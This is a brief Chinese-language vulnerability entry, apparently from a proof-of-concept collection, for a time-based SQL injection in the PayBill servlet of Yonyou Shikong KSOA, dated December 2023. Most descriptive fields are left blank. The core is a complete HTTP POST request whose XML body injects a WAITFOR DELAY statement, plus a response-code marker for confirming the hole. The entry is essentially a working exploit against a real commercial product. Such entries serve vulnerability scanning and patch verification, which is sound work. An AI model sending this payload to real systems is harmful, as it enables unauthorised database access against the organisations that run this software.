﻿# 用友时空KSOA PayBill SQL注入漏洞 (延时注入测试)

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /servlet/PayBill?caculate&_rnd= HTTP/1.1

<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:05';-</name><name>1</name><name>102360</name></root>
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友时空KSOA PayBill SQL注入漏洞.poc
